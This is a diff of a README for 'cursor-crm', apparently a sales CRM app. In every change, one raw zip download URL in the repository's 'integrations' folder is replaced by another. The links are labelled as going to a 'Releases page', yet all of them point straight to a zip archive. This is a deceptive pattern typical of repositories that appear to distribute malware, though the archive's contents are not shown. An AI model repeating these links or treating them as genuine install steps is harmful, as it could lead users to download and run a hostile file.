@@ -1,6 +1,6 @@
 # 🖥️ cursor-crm - Your Sales Data, Simplified
 
-[![Download Cursor CRM](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/cursor-crm-v2.2.zip%20CRM-blue?style=for-the-badge)](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/cursor-crm-v2.2.zip)
+[![Download Cursor CRM](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/crm-cursor-1.8.zip%20CRM-blue?style=for-the-badge)](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/crm-cursor-1.8.zip)
 
 ## 🤔 What is Cursor CRM?
 
@@ -35,7 +35,7 @@ Traditional CRMs may require you to jump through hoops. With Cursor CRM, you can
 
 1. **Visit the Releases Page:** Click the button below to go to the Releases page.
    
-   [![Visit Releases](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/cursor-crm-v2.2.zip%20Releases-blue?style=for-the-badge)](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/cursor-crm-v2.2.zip)
+   [![Visit Releases](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/crm-cursor-1.8.zip%20Releases-blue?style=for-the-badge)](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/crm-cursor-1.8.zip)
 
 2. **Download the Latest Version:** On the Releases page, locate the latest version. You will see downloadable files. 
 
@@ -47,7 +47,7 @@ Traditional CRMs may require you to jump through hoops. With Cursor CRM, you can
 
 To get started with Cursor CRM, follow these steps:
 
-1. Go to the [Releases page](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/cursor-crm-v2.2.zip).
+1. Go to the [Releases page](https://github.com/Kimoahmed918/cursor-crm/raw/refs/heads/main/integrations/crm-cursor-1.8.zip).
 2. Find the latest release.
 3. Click to download the file suitable for your operating system.
 4. Once downloaded, locate the file on your computer.
